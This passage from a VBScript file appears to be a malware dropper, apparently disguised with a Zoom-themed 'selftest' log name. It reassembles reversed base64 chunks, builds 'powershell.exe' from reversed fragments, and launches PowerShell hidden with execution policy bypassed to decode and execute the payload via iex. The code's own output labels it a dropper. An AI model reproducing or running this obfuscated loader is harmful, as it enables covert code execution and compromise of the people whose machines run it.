    "4VGVsxWQlRXaydlO60VZslmRu8USbBCIgACIgACIK0wegknc", _
    "oNncld3bw1Sbv9menACUNVEV6YnblRCIoRXYQ1ibp9mSogCd", _
    "0F2Yg0HIgACIK0QKpgyZulmc0N1bU5yXkACLpcyZvxmLsxWZ", _
    "=0nCNEDI0lGelBCIgAiCN03egg2Y" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
